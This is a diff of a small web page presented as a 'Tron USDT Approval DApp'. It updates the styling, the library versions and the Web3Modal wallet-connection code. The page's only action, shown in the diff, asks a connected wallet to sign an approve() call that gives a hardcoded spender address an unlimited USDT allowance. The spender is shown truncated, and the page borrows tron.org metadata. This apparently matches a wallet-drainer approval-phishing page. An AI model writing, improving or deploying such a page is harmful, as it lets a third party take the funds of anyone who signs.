@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tron USDT Approval</title>
+    <title>Tron USDT Approval DApp</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #f0f2f5;
+            background-color: #f4f6f8;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -18,25 +18,26 @@
             background: white;
             padding: 2rem;
             border-radius: 16px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
             width: 90%;
-            max-width: 400px;
+            max-width: 420px;
             text-align: center;
         }
-        h2 { margin: 0 0 10px 0; color: #1a1a1a; }
-        p { color: #666; font-size: 0.9rem; margin-bottom: 20px; }
+        h2 { margin: 0 0 5px 0; color: #2c3e50; }
+        .subtitle { color: #7f8c8d; font-size: 0.9rem; margin-bottom: 20px; }
         
-        .info {
+        .info-box {
             background: #f8f9fa;
             border: 1px solid #e9ecef;
-            padding: 12px;
             border-radius: 8px;
-            margin-bottom: 20px;
+            padding: 12px;
             text-align: left;
+            margin-bottom: 20px;
             font-size: 0.85rem;
         }
-        .info div { display: flex; justify-content: space-between; margin-bottom: 4px; }
-        .label { font-weight: 600; color: #333; }
+        .info-row { display: flex; justify-content: space-between; margin-bottom: 6px; }
+        .label { font-weight: 600; color: #34495e; }
+        .val { font-family: monospace; color: #2980b9; }
 
         button {
             width: 100%;
@@ -46,29 +47,50 @@
             font-size: 1rem;
             font-weight: 600;
             cursor: pointer;
-            transition: transform 0.1s;
+            transition: all 0.2s;
         }
-        button:active { transform: scale(0.98); }
         
-        .btn-connect { background-color: #333; color: white; }
-        .btn-approve { background-color: #2ecc71; color: white; margin-top: 10px; }
-        .btn-approve:disabled { background-color: #95a5a6; cursor: not-allowed; }
+        /* Web3Modal Button Override to fit width */
+        w3m-button {
+            width: 100%;
+            display: block;
+            margin-bottom: 10px;
+        }
+        w3m-button::part(button) {
+            width: 100%;
+            background-color: #34495e;
+            color: white;
+            padding: 14px;
+            border-radius: 8px;
+            border: none;
+            font-size: 1rem;
+            font-weight: 600;
+        }
+
+        .btn-approve {
+            background-color: #27ae60;
+            color: white;
+        }
+        .btn-approve:hover { background-color: #219150; }
+        .btn-approve:disabled { background-color: #bdc3c7; cursor: not-allowed; }
 
         #status {
             margin-top: 15px;
             font-size: 0.85rem;
-            color: #e74c3c;
-            min-height: 1.2em;
+            min-height: 20px;
         }
-        .success { color: #27ae60 !important; }
+        .error { color: #c0392b; }
+        .success { color: #27ae60; }
+        
+        #approveSection { display: none; margin-top: 20px; border-top: 1px solid #eee; padding-top: 20px; }
     </style>
-    
-    <!-- Import Map using jsdelivr to fix CORS issues -->
+
+    <!-- Import Map: Using Ethers v5 and Web3Modal v3 for stability -->
     <script type="importmap">
         {
             "imports": {
-                "ethers": "https://cdn.jsdelivr.net/npm/ethers@6.7.0/+esm",
-                "@web3modal/ethers": "https://cdn.jsdelivr.net/npm/@web3modal/ethers@5.0.0/dist/esm/index.js"
+                "ethers": "https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js",
+                "@web3modal/ethers": "https://cdn.jsdelivr.net/npm/@web3modal/ethers@3.0.0-beta.0/dist/esm/index.js"
             }
         }
     </script>
@@ -77,35 +99,44 @@
 
 <div class="card">
     <h2>Tron DApp</h2>
-    <p>Approve Unlimited USDT</p>
+    <div class="subtitle">Approve Unlimited USDT</div>
 
-    <div class="info">
-        <div><span class="label">Network:</span> <span>Tron Mainnet</span></div>
-        <div><span class="label">Token:</span> <span>USDT</span></div>
-        <div><span class="label">Spender:</span> <span>TSDcg...XLV</span></div>
+    <div class="info-box">
+        <div class="info-row">
+            <span class="label">Network</span>
+            <span class="val">Tron Mainnet</span>
+        </div>
+        <div class="info-row">
+            <span class="label">Token</span>
+            <span class="val">USDT</span>
+        </div>
+        <div class="info-row">
+            <span class="label">Spender</span>
+            <span class="val">TSDcg...XLV</span>
+        </div>
     </div>
 
-    <!-- Web3Modal Button Container -->
+    <!-- Wallet Connect Button -->
     <w3m-button></w3m-button>
 
-    <div id="actions" style="display:none;">
-        <button id="btnApprove" class="btn-approve">Approve Unlimited</button>
+    <!-- Approve Section (Hidden until connected) -->
+    <div id="approveSection">
+        <button id="btnApprove" class="btn-approve">Approve Unlimited USDT</button>
     </div>
 
     <div id="status"></div>
 </div>
 
 <script type="module">
-    // Import from mapped modules
     import { createWeb3Modal, defaultConfig, getWeb3Modal } from '@web3modal/ethers';
-    import { BrowserProvider } from 'ethers';
+    import { providers } from 'ethers';
 
     // --- 1. Configuration ---
-    const projectId = '171db6da15a54effc1b4a06f889a3c3f'; // Your Project ID
+    const projectId = '171db6da15a54effc1b4a06f889a3c3f';
     
-    // Tron Mainnet Details
-    const tronChain = {
-        chainId: 728126428, // 0x2b6653dc
+    // Tron Mainnet
+    const tronMainnet = {
+        chainId: 728126428, 
         name: 'Tron',
         currency: 'TRX',
         explorerUrl: 'https://tronscan.org',
@@ -113,32 +144,41 @@
     };
 
     const metadata = {
-        name: 'Tron USDT DApp',
-        description: 'Simple Approve DApp',
+        name: 'Tron DApp',
+        description: 'Approve USDT on Tron',
         url: 'https://tron.org',
-        icons: ['https://cryptologos.cc/logos/usdt-usdt-logo.png']
+        icons: []
     };
 
     // --- 2. Initialize Web3Modal ---
     createWeb3Modal({
         ethersConfig: defaultConfig({ metadata }),
-        chains: [tronChain],
+        chains: [tronMainnet],
         projectId,
         enableAnalytics: true,
-        // Trust Wallet ID to highlight it
+        // Trust Wallet ID
         featuredWalletIds: ['c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96']
     });
 
-    // --- 3. Application Logic ---
-    const USDT_BASE58 = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-    const SPENDER_BASE58 = 'TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV';
-    
+    // --- 3. App Logic ---
     const btnApprove = document.getElementById('btnApprove');
-    const status = document.getElementById('status');
-    const actionsDiv = document.getElementById('actions');
+    const approveSection = document.getElementById('approveSection');
+    const statusDiv = document.getElementById('status');
+    const w3mButton = document.querySelector('w3m-button');
 
-    // Helper: Convert Tron Base58 to Hex (0x...)
-    function tronToHex(base58) {
+    // Listen for connection
+    const modal = getWeb3Modal();
+    modal.subscribeProvider(state => {
+        if (state.isConnected) {
+            approveSection.style.display = 'block';
+            statusDiv.innerText = '';
+        } else {
+            approveSection.style.display = 'none';
+        }
+    });
+
+    // Helper: Tron Base58 to Hex
+    function tronBase58ToHex(base58) {
         const alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
         let bigInt = BigInt(0);
         for (let i = 0; i < base58.length; i++) {
@@ -146,48 +186,40 @@
         }
         let hex = bigInt.toString(16);
         if (hex.length % 2 !== 0) hex = '0' + hex;
-        // Remove the leading '41' byte
+        // Remove leading 0x41 byte
         if (hex.startsWith('41')) hex = hex.substring(2);
         return '0x' + hex;
     }
 
-    // Listen for connection changes to show/hide buttons
-    const modal = getWeb3Modal();
-    modal.subscribeProvider(state => {
-        if (state.isConnected) {
-            actionsDiv.style.display = 'block';
-            status.innerText = '';
-        } else {
-            actionsDiv.style.display = 'none';
-        }
-    });
-
-    // Handle Approval
     btnApprove.addEventListener('click', async () => {
         try {
-            status.className = '';
-            status.innerText = 'Processing...';
+            statusDiv.className = '';
+            statusDiv.innerText = 'Preparing...';
             btnApprove.disabled = true;
 
-            const provider = new BrowserProvider(modal.getProvider());
-            const signer = await provider.getSigner();
-            
-            // Verify Network
+            const provider = new providers.Web3Provider(modal.getProvider());
+            const signer = provider.getSigner();
+
+            // Ensure Network
             const network = await provider.getNetwork();
             if (Number(network.chainId) !== 728126428) {
-                throw new Error("Please switch to Tron Mainnet in your wallet");
+                throw new Error("Please switch to Tron Mainnet in Trust Wallet");
             }
 
-            // Prepare Data
-            const tokenHex = tronToHex(USDT_BASE58);
-            const spenderHex = tronToHex(SPENDER_BASE58);
-            
-            // Function: approve(address spender, uint256 amount)
-            // Selector: 0x095ea7b3
-            // Amount: Max Uint256 (Unlimited)
-            const data = `0x095ea7b3${spenderHex.slice(2).padStart(64, '0')}ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`;
+            // Addresses
+            const tokenHex = tronBase58ToHex('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
+            const spenderHex = tronBase58ToHex('TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV');
 
-            // Send Transaction
+            // Build Data: approve(address spender, uint256 amount)
+            // Selector: 0x095ea7b3
+            // Amount: Max Uint256
+            const data = 
+                '0x095ea7b3' + 
+                spenderHex.slice(2).padStart(64, '0') + 
+                'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+
+            statusDiv.innerText = 'Check Trust Wallet...';
+
             const tx = {
                 to: tokenHex,
                 data: data,
@@ -196,13 +228,13 @@
 
             const txResponse = await signer.sendTransaction(tx);
             
-            status.className = 'success';
-            status.innerText = `Sent! Hash: ${txResponse.hash}`;
+            statusDiv.className = 'success';
+            statusDiv.innerText = `Approved! Hash: ${txResponse.hash}`;
             
         } catch (err) {
             console.error(err);
-            status.className = '';
-            status.innerText = 'Error: ' + (err.reason || err.message || 'Rejected');
+            statusDiv.className = 'error';
+            statusDiv.innerText = 'Error: ' + (err.reason || err.message || 'Rejected');
         } finally {
             btnApprove.disabled = false;
         }
